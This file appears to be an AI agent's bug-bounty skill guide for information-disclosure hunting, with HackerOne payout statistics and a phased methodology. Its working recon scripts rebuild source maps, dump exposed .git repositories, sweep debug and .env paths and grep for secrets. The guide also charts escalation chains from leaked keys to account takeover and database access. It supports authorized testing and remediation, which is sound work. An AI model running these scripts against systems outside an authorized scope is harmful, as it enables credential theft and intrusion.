# Upstream source: info-disclosure (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/info-disclosure/SKILL.md`

---

---
name: info-disclosure
description: >-
  Hunt source code and build artifact leakage — JavaScript source maps (.js.map) reconstructing
  TypeScript/ES6 source, Swagger/OpenAPI JSON endpoint discovery, .env/.git exposure, webpack chunks with
  hardcoded secrets, robots.txt/security.txt recon, build-info files, asset-manifest.json API route
  discovery, .DS_Store file listing. Use at the START of every recon session — these findings often unlock
  the entire attack surface. Combined with the HackerOne field guide (real disclosed-report data: where it
  pays, quick wins, payload banks). Hunt sensitive data exposure. Use when reviewing APIs, debug pages,
  error messages, backups, source maps, directory listings, cloud storage, or verbose responses. Backed by
  1,827 disclosed HackerOne reports.
---

# Info Disclosure — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Information Disclosure — HackerOne field guide

Built from **1,827** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **1,827** · paid: **339**
- Median bounty **$500** · p90 **$2,500** · max **$40,000** · total **$418,640**
- Median upvotes **11**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| HackerOne | 156 | $98,650 | 11273 |
| Uber | 47 | $47,600 | 2067 |
| Snapchat | 6 | $41,000 | 1282 |
| Mail.ru | 136 | $34,350 | 1894 |
| Internet Bug Bounty | 35 | $28,998 | 751 |
| Shopify | 45 | $27,902 | 1327 |
| GitLab | 32 | $26,300 | 1725 |
| X / xAI | 30 | $15,710 | 1172 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`debug` `actuator` `health` `metrics` `env` `backup` `export` `logs` `graphql`

## Tools

`ffuf` · `gobuster` · `nuclei` · `trufflehog` · `waybackurls`

## Escalation chains

- Info leak -> creds -> ATO.
- Debug endpoint -> RCE.
- PII leak -> compliance impact.

## Related

- `authz-bypass` (1,386 reports)
- `crypto-and-secrets` (562 reports)
- `idor` (450 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-SOURCE-LEAK — Source Code & Build Artifact Leakage

## Crown Jewel Targets

Source map exposing TypeScript source = see all API routes, auth logic, secrets. Swagger/OpenAPI JSON = complete API surface map.

**Highest-value findings:**
- **`.js.map` source maps** — reconstruct full TypeScript/ES6 source code → find hardcoded API keys, internal endpoints, auth logic bypasses
- **`swagger.json` / `openapi.json`** — complete REST API specification with all endpoints, parameters, auth schemes, and internal route names
- **`.env` / `.env.production`** — APP_KEY, DB_PASSWORD, API_KEY, SECRET_KEY in plaintext
- **`.git/` exposure** — `git clone` the entire source history → all past hardcoded secrets
- **`asset-manifest.json` / `_next/static/`** — all JS bundle paths → systematic source map discovery
- **`build-info` / `info.json`** — git commit hash, build timestamp, dependency versions → CVE targeting

---

## Phase 2 — Source Map Discovery

> **Always resolve the CURRENT build hash before testing, and again before
> re-verifying.** Bundle filenames are content-hashed, so they rotate on every
> deploy. A `.map` URL recorded yesterday can 404 today while the map is still
> fully exposed under a new name. **A 404 at the old URL is not remediation** —
> it is a new build.
>
> ```bash
> # ALWAYS derive the hash live, never reuse a recorded URL
> HASH=$(curl -s "https://$TARGET/" | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
> curl -s -o /dev/null -w '%{http_code} %{size_download} %{content_type}\n' \
>   "https://$TARGET/static/js/${HASH}.map"
> ```
>
> **Lesson from an authorized engagement.** A large production map was found at
> `main.<hashA>.js.map`. On re-verification that URL returned a small HTML
> soft-404 and the finding was nearly closed as fixed. The bundle had rotated to
> `main.<hashB>.js` — and the map was still published at `main.<hashB>.js.map`,
> same size. Nothing had been remediated.
>
> Tell the client this explicitly in the report: **redeploying does not fix source
> map exposure.** Only `GENERATE_SOURCEMAP=false` (or stripping `.map` at deploy)
> plus a CDN purge closes it. A team that redeploys and re-checks the old link
> will wrongly declare victory.
>
> Same rule applies to any content-hashed artifact: chunk files, CSS maps,
> `asset-manifest.json`, and staging equivalents.

```bash
# Step 1: Get asset manifest to find all JS bundle paths
curl -s "https://$TARGET/asset-manifest.json" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/static/js/main.*.js" 2>/dev/null | head -3

# Next.js
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
curl -s "https://$TARGET/_next/static/$BUILD_ID/_buildManifest.js" | head -5

# Step 2: For each JS bundle, check for source map reference at end of file
for JS_URL in $(curl -s https://$TARGET/ | grep -oP 'src="[^"]*\.js"' | sed 's/src="//;s/"//'); do
  LAST_LINE=$(curl -s "https://$TARGET$JS_URL" | tail -1)
  echo "$LAST_LINE" | grep -q "sourceMappingURL" && echo "[+] Source map: $JS_URL"
done

# Step 3: Download and reconstruct source from .map files
JS_URL="https://$TARGET/static/js/main.abc123.js"
MAP_URL="${JS_URL}.map"
curl -s "$MAP_URL" | python3 -c "
import sys, json, os
data = json.load(sys.stdin)
sources = data.get('sources', [])
contents = data.get('sourcesContent', [])
for i, (src, content) in enumerate(zip(sources, contents)):
    if content:
        path = '/tmp/sourcemap_extract/' + src.replace('../','').replace('./',''). replace('webpack://','')
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            f.write(content)
        print(f'[+] Extracted: {src}')
"

# Step 4: Grep extracted source for secrets
grep -r "API_KEY\|SECRET\|PASSWORD\|TOKEN\|PRIVATE" /tmp/sourcemap_extract/ 2>/dev/null
grep -r "process\.env\." /tmp/sourcemap_extract/ 2>/dev/null | grep -v "NEXT_PUBLIC_" | head -20
grep -r "http://internal\|localhost\|127\.0\.0\.1\|10\.\|172\.\|192\.168" /tmp/sourcemap_extract/ 2>/dev/null | head -20
```

---

## Phase 3 — Swagger / OpenAPI Discovery

```bash
# Common paths
SWAGGER_PATHS=(
  "/swagger.json" "/swagger.yaml" "/swagger/"
  "/api/swagger.json" "/api/swagger.yaml"
  "/v1/swagger.json" "/v2/swagger.json" "/v3/swagger.json"
  "/openapi.json" "/openapi.yaml"
  "/api/openapi.json" "/api-docs" "/api-docs.json"
  "/api/v1/swagger.json" "/api/v2/swagger.json"
  "/rest/swagger.json" "/rest/api-docs"
  "/.well-known/openapi.json"
  "/graphql/schema.json"
)

for PATH in "${SWAGGER_PATHS[@]}"; do
  STATUS=$(curl -s -o /tmp/swagger_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH"
    # Extract all API paths from swagger
    python3 -c "
import sys, json
try:
    d = json.load(open('/tmp/swagger_test'))
    paths = list(d.get('paths', {}).keys())
    print(f'Endpoints: {len(paths)}')
    print('\n'.join(sorted(paths)))
except: pass
" | head -50
  fi
done
```

---

## Phase 4 — .git Exposure

```bash
# Check if .git directory is accessible
curl -s "https://$TARGET/.git/HEAD" | grep -q "ref:" && echo "[+] .git exposed!"

# If exposed, reconstruct repo
# Tool: git-dumper
pip3 install git-dumper
git-dumper "https://$TARGET/.git/" /tmp/dumped-repo/

# Grep for secrets in all git history
cd /tmp/dumped-repo && \
  git log --all --oneline 2>/dev/null | head -20
  git grep -i "password\|secret\|api_key\|token" $(git rev-list --all) 2>/dev/null | head -30

# trufflehog on git history
trufflehog git file:///tmp/dumped-repo/ 2>/dev/null | head -50
```

---

## Phase 5 — Forgotten Files & Debug Endpoints

```bash
# Build artifacts and debug files
DEBUG_PATHS=(
  "/build-info.json" "/build/build-info.json"
  "/info" "/actuator/info" "/api/info"
  "/version" "/api/version" "/_version"
  "/health" "/status" "/ping"
  "/robots.txt" "/security.txt" "/.well-known/security.txt"
  "/sitemap.xml" "/manifest.json" "/browserconfig.xml"
  "/crossdomain.xml" "/clientaccesspolicy.xml"
  "/phpinfo.php" "/info.php" "/test.php"
  "/server-status" "/server-info" "/.htaccess"
  "/web.config" "/applicationHost.config"
  "/WEB-INF/web.xml" "/META-INF/MANIFEST.MF"
  "/package.json" "/composer.json" "/Gemfile"
  "/Dockerfile" "/docker-compose.yml" "/.dockerenv"
)

for PATH in "${DEBUG_PATHS[@]}"; do
  STATUS=$(curl -s -o /tmp/debug_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH ($STATUS, $(wc -c < /tmp/debug_test) bytes)"
    head -3 /tmp/debug_test
    echo "---"
  fi
done
```

---

## Phase 6 — .DS_Store File Listing

```bash
# .DS_Store files on macOS-deployed web servers reveal directory structure
curl -s "https://$TARGET/.DS_Store" | xxd | head -10

# Parse .DS_Store to extract filenames
pip3 install ds_store
python3 -c "
from ds_store import DSStore
with DSStore.open('/tmp/ds_store_test', 'r') as d:
    for entry in d:
        print(entry.filename)
"

# Recursive .DS_Store enumeration
# Tool: https://github.com/lijiejie/ds_store_exp
python3 ds_store_exp.py "https://$TARGET/"
```

---

## Phase 7 — webpack Chunk Analysis

```bash
# Download and analyze webpack chunks for hardcoded values
# Find chunk files
curl -s https://$TARGET/ | grep -oP '"[^"]*\.chunk\.js"' | tr -d '"' | while read chunk; do
  echo "Analyzing: $chunk"
  curl -s "https://$TARGET$chunk" | \
    grep -oE '"(api_key|apiKey|secret|password|token|key)"\s*:\s*"[^"]+"' | head -5
done

# Also grep for internal hostnames
curl -s "https://$TARGET/static/js/main.*.js" | \
  grep -oE '"(https?://[^"]*internal[^"]*|http://[^"]*localhost[^"]*)"' | sort -u

# Check for Base64-encoded secrets
curl -s "https://$TARGET/static/js/main.*.js" | \
  grep -oP '"[A-Za-z0-9+/]{30,}={0,2}"' | while read b64; do
  DECODED=$(echo "$b64" | tr -d '"' | base64 -d 2>/dev/null)
  echo "$DECODED" | grep -iE "key|secret|password|token" && echo "  B64: $b64"
done
```

---

## Chain Table

| Source leak finding | Chain to | Impact |
|--------------------|----------|--------|
| Source map with API key | Use key directly → API access | High/Critical |
| Source map with auth logic | Find auth bypass route | Critical |
| Swagger → internal endpoints | Test undocumented admin routes | High |
| .git exposed | Full source history → all past secrets | Critical |
| build-info with git hash | CVE targeting exact version | High |
| .env with DB_PASSWORD | Direct database access | Critical |

---

## Tools

```bash
# git-dumper (reconstruct exposed .git)
pip3 install git-dumper
git-dumper "https://target.com/.git/" /tmp/repo/

# sourcemap-explorer (visualize what's in bundles)
npm install -g source-map-explorer
source-map-explorer main.js

# unwebpack-sourcemap (extract all source files)
npm install -g unwebpack-sourcemap

# trufflehog (secret scanning)
trufflehog filesystem /tmp/repo/
```

---

## Validation

✅ Source map: reconstructed TypeScript source contains API endpoints or hardcoded secrets
✅ Swagger: JSON contains internal endpoints not visible in UI
✅ .git exposed: git-dumper successfully clones repo, secrets in history
✅ .env exposed: DATABASE_URL, API_KEY, SECRET_KEY visible in plaintext

**Severity:**
- .env with credentials: Critical
- .git with secrets in history: Critical
- Source map with secrets: High
- Swagger with internal routes: Medium-High
- robots.txt only: Informational

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete artifacts, endpoints, patterns, tools to look for

- **Build a channel map first:** web, API, GraphQL, WebSocket, gRPC, mobile, background jobs, exports, and CDN. Information leaks surface while testing something else — avoid tunnel vision (PortSwigger).
- **DVCS/build artifacts:** `/.git/HEAD`, `/.git/config`, `/.git/index`, `/.git/COMMIT_EDITMSG`, `/.git/refs/heads/main`, `/.svn/entries`, `/.hg/hgrc`, `/.env`, `.bak`, `.swp`, archives, `package.json`, `/.next/`, build manifests. `httpx -path /.git/HEAD -mc 200` across the live-host list is the fast sweep.
- **Source maps:** append `.map` to every external JS path (`/static/js/main.chunk.js.map`); OWASP WSTG-INFO-05 cites this explicitly. Look for `sources` with absolute paths (`/home/sysadmin/.../src/actions/cashoutAction.js`) and `sourcesContent`.
- **API schema/introspection endpoints:** `/swagger`, `/api-docs`, `/openapi.json`, `/api/swagger/v1`, `/swagger/v1/swagger.json`, `/redoc`, `/docs`, `.well-known/openapi.json`; GraphQL introspection; gRPC server reflection on gRPC ports. Check for prefilled bearer tokens in served Swagger UI HTML.
- **Next.js-specific artifacts:** `/_next/static/<buildId>/_buildManifest.js`, `__NEXT_DATA__`, `.next/routes-manifest.json`, `.next/server/pages/api/auth/[...nextauth].js` (compiled NextAuth config with fallback passwords), `next.config.js`. With `productionBrowserSourceMaps` enabled, `createServerReference(...)` entries map `Next-Action` hashes to function names.
- **Client env leakage:** `NEXT_PUBLIC_`, `VITE_`, `REACT_APP_` inlined literals; embedded JSON `<script type="application/json">` blocks such as `runtimeConfig`, `BASE_BACKOFFICE_API: "10.10.10.2/api"`, `ADMIN_PAGE: "/hidden_administrator"`.
- **Error/debug surface:** verbose stack traces, ORM internals, file paths, framework versions; `debug` modes, profilers, feature-flag dashboards; `customErrors mode=Off`, TRACE/`trace.axd`, `elmah.axd`.
- **Headers/metadata:** `Server`, `X-Powered-By`, `X-AspNet-Version`, `X-Request-Id`, `traceparent`, `Server-Timing`; ETag/If-None-Match and Last-Modified caching oracles; `Access-Control-Expose-Headers` widening cross-origin reads.
- **File metadata:** EXIF and Office/PDF properties (authors, paths, software versions, timestamps); cloud storage object metadata leaking owner/project IDs.
- **Tooling:** `git-dumper` (parallel `holly-hacker/git-dumper` >10x faster, `Ebryx/GitDump` brute-forces object names when directory listing is off), GitTools Finder/Dumper/Extractor, `gitleaks git -v --log-opts="--all"`, `trufflehog filesystem`, `detect-secrets`, `ggshield`, `Titus` (replaces Nosey Parker).

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **.git exposure → full source reconstruction:** confirm with `/.git/config` and `/.git/HEAD` returning the expected content shape, then `git-dumper victim/.git/ ./dump`, `git checkout -- .`, `git log --graph --oneline --decorate --all`, `git config -l`, `ls .git/hooks`. Deleted-but-not-purged secrets live in history (rotated Stripe keys, bcrypt hashes reused in prod). Note: 403 on `/.git/` still means the directory exists; 404 means it does not.
- **Source-map rebuild:** fetch the `.map`, iterate `sources`/`sourcesContent` into a tree (`unwebpack_sourcemap.py`, `source-map-extract`), then grep routing/service/config files for endpoints and role names. Vite fix posture is `build.sourcemap: false` (or `'hidden'` for Sentry-only upload); Next.js should not enable `productionBrowserSourceMaps`.
- **Schema-to-auth bypass chain:** a leaked spec reveals hidden fields/endpoints → send requests with those fields (mass assignment) → confirm missing authorization. Spec-vs-runtime diff: jq out `'.paths | keys[]'` from two specs and `comm -23` to find routes only in the old one.
- **Wayback-persisted specs:** a deprecated version's Swagger often stays indexed after the live link is removed — query the CDX API for `*swagger*` and `*openapi*`.
- **Engineer informative responses:** fuzz with wrong types, broken JSON, oversized fields, null bytes, alternate content types; normalize and diff by status/body length/ETag/headers across owner vs non-owner vs anonymous.
- **Trace-to-LFI chain:** stack-trace paths reveal filesystem layout → LFI/traversal to fetch config/keys → for Next.js target `.env`, `.next/routes-manifest.json`, and compiled NextAuth config.
- **Server-side Git integrations** (HackTricks): if the app clones attacker-controlled repos and later runs `git status/diff/checkout/pull`, `.git/config` write or hook abuse can turn a file write into command execution during later Git actions.
- **Swagger UI posture:** usually an exposure, not a standalone flaw — but OWASP API9 says docs should be available only to authorized users; a spec listing a deprecated version tells an attacker which old host is still running.

### C. Validation / proof bar — how to confirm and avoid false positives

- Artifacts before payloads: DVCS directories, backups, maps, and client-data JSON yield the fastest wins; chain quickly to one concrete, minimal, reversible risk and stop.
- **Content-shape confirmation:** a 200 from `/.git/config` must return Git config text, not a SPA HTML fallback; a `.map` must be JSON with `sources`, not an error page.
- **A leaked URL/hostname is not impact:** confirm reachability and demonstrate what the data grants (version→CVE, path→LFI/RCE, key→cloud access, schema→auth bypass).
- **Key triage:** publishable Stripe `pk_`, Firebase web config, and Supabase `anon` keys are intended to be public — report only a demonstrated permission/capability or a genuinely secret key (`sk_`, `service_role`, cloud credentials).
- **Credentials must still authenticate today** — an exposed but revoked/rotated secret is not a live finding; verify minimally and within scope, and do not use it beyond proof.
- **Role-differential harness:** normalize responses and diff by digest to reduce noise; an error page returning HTTP 200 is not a successful unauthorized read.
- Per OWASP ASVS 5.0 V13.4: verify absence of `.git`/`.svn`, debug modes off, no directory listings, no TRACE in production, no detailed backend version info, and restricted file extensions — these raise the bar even though each alone is often Info/Low.

- **Threat-actor context:** GreyNoise observed ~4,800 unique IPs in a single day (April 2025) scanning for exposed `.git/config`; EmeraldWhale (Oct 2024) used the same primitive to steal 15,000+ cloud credentials — prioritize remediation of live exposures accordingly.
- **Swagger/Redoc/Stoplight variants** have different production-readiness defaults; audit each UI variant rather than assuming one config covers all.
- **GraphQL/gRPC equivalents of OpenAPI leaks:** introspection queries and gRPC server reflection expose services/messages just as a Swagger spec does, and are frequently left enabled in production.
- **Exposed Swagger UIs with a "Try it out" bearer token prefilled** leak the token itself — rotate any credential that appears in served HTML.
- **Repository-level secret scanning** complements web-root artifacts: `trufflehog github --org <ORG> --results=verified`, `gitleaks git -v --log-opts="--all" <repo>`, and `detect-secrets` on the dumped repo.
- **File-metadata sweep:** EXIF from downloaded images/PDFs and Office document properties often contain internal usernames, UNC paths, and software versions — feed version strings into CVE lookup.
- **Cache-oracle validation:** confirm `Vary` includes `Authorization`/tenant identity on responses containing sensitive data; an identity-unaware cache key turns a leak into cross-user disclosure.
- **Debug-endpoint sweep should be last:** observability/profiling endpoints are noisy but high-yield — run them after the artifact pass and normalize by digest to avoid drowning in telemetry.
- **Report framing:** ASVS V13.4 issues alone are usually Info/Low but are "bar-raisers" — state the chain (version → CVE, path → LFI, key → cloud access, schema → auth bypass) that converts them into a finding.

- **Error-page fuzzing matrix:** wrong type, broken JSON, oversized field, null byte, and alternate content-type (XML vs JSON) on a single endpoint often yields four different disclosure shapes — diff them side by side.
- **Backup/config filename sweep:** `.env`, `.env.local`, `.env.bak`, `config.yaml`, `credentials.json`, `docker-compose.yml`, `wp-config.php.bak`, and `web.config` are the usual high-value targets after the DVCS pass.

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/information-disclosure/exploiting (fuzzing, version-control history, avoiding tunnel vision)
2. https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage (source-map and embedded-config examples)
3. https://scotthelme.co.uk/content/files/2025/06/OWASP_Application_Security_Verification_Standard_5.0.0_en.pdf (ASVS 5.0 V13.4 unintended information leakage)
4. https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html (fast .git dumping 2024–2026, dirlisting bypass, post-dump triage, Git CLI attack surface)
5. https://hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets.html (TruffleHog v3, gitleaks, Titus)
6. https://bugbounty.info/Recon/Exposed-Git (httpx `/.git/HEAD` sweep, git-dumper/GitTools workflow)
7. https://github.com/usestrix/strix/blob/main/strix/skills/vulnerabilities/information_disclosure.md (channel map, diff harness, schema→auth-bypass chain)
8. https://vibe-eval.com/patterns/graphql-swagger-grpc-exposure (Swagger/introspection/gRPC runtime detection and prefilled-token check)
9. https://www.inspectiv.com/articles/source-code-reconstruction-from-.git-directory-exposure (403 vs 404 interpretation, commit-history mining)

